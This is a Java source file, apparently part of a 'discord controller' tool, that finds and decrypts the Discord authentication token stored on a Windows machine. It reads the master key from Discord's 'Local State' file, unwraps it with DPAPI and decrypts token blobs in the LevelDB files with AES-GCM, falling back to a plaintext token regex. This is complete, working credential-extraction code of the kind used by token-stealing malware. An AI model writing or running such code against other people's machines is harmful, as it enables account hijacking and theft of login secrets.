package com.juicy.discordcontroller;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TokenDetector {

    private static final byte[] MARKER = "dQw4w9WgXcQ:".getBytes(StandardCharsets.US_ASCII);

    private static final Pattern PLAINTEXT =
            Pattern.compile("[A-Za-z0-9_\\-]{24}\\.[A-Za-z0-9_\\-]{6}\\.[A-Za-z0-9_\\-]{27,}");

    public static String detect() {
        Path appdata = Path.of(System.getenv("APPDATA"));
        Path base = appdata.resolve("discord");

        byte[] key = readMasterKey(base.resolve("Local State"));
        Path leveldb = base.resolve("Local Storage").resolve("leveldb");
        if (!Files.isDirectory(leveldb)) {
            return null;
        }

        if (key != null) {
            for (Path f : listLevelDbFiles(leveldb)) {
                String token = scanEncrypted(readAll(f), key);
                if (token != null) {
                    return token;
                }
            }
        }

        for (Path f : listLevelDbFiles(leveldb)) {
            String token = scanPlaintext(readAll(f));
            if (token != null) {
                return token;
            }
        }

        return null;
    }

    private static byte[] readMasterKey(Path localState) {
        try {
            String json = Files.readString(localState);
            JsonObject root = JsonParser.parseString(json).getAsJsonObject();
            String b64 = root.getAsJsonObject("os_crypt").get("encrypted_key").getAsString();
            byte[] blob = Base64.getDecoder().decode(b64);
            if (blob.length <= 5) {
                return null;
            }
            return Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(blob, 5, blob.length));
        } catch (Exception e) {
            return null;
        }
    }

    private static String scanEncrypted(byte[] data, byte[] key) {
        if (data == null) {
            return null;
        }
        int idx = indexOf(data, MARKER, 0);
        while (idx >= 0) {
            int start = idx + MARKER.length;
            int end = start;
            while (end < data.length && isBase64(data[end])) {
                end++;
            }
            if (end > start) {
                String token = decrypt(Arrays.copyOfRange(data, start, end), key);
                if (token != null && looksLikeToken(token)) {
                    return token;
                }
            }
            idx = indexOf(data, MARKER, end + 1);
        }
        return null;
    }

    private static String scanPlaintext(byte[] data) {
        if (data == null) {
            return null;
        }
        Matcher m = PLAINTEXT.matcher(new String(data, StandardCharsets.ISO_8859_1));
        return m.find() ? m.group() : null;
    }

    private static String decrypt(byte[] payload, byte[] key) {
        try {
            byte[] encrypted = Base64.getDecoder().decode(payload);
            byte[] nonce = Arrays.copyOfRange(encrypted, 3, 15);
            byte[] ciphertext = Arrays.copyOfRange(encrypted, 15, encrypted.length - 16);
            byte[] tag = Arrays.copyOfRange(encrypted, encrypted.length - 16, encrypted.length);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec spec = new SecretKeySpec(key, "AES");
            cipher.init(Cipher.DECRYPT_MODE, spec, new GCMParameterSpec(128, nonce));
            byte[] combined = new byte[ciphertext.length + tag.length];
            System.arraycopy(ciphertext, 0, combined, 0, ciphertext.length);
            System.arraycopy(tag, 0, combined, ciphertext.length, tag.length);
            return new String(cipher.doFinal(combined), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean looksLikeToken(String token) {
        return token != null
                && (token.startsWith("mfa.") || token.chars().filter(c -> c == '.').count() == 2);
    }

    private static List<Path> listLevelDbFiles(Path dir) {
        try (var stream = Files.list(dir)) {
            return stream.filter(p -> {
                String n = p.getFileName().toString().toLowerCase();
                return n.endsWith(".ldb") || n.endsWith(".log");
            }).toList();
        } catch (Exception e) {
            return List.of();
        }
    }

    private static byte[] readAll(Path p) {
        try {
            return Files.readAllBytes(p);
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean isBase64(byte b) {
        return (b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z')
                || (b >= '0' && b <= '9') || b == '+' || b == '/' || b == '=';
    }

    private static int indexOf(byte[] haystack, byte[] needle, int from) {
        outer:
        for (int i = Math.max(0, from); i <= haystack.length - needle.length; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    continue outer;
                }
            }
            return i;
        }
        return -1;
    }
}
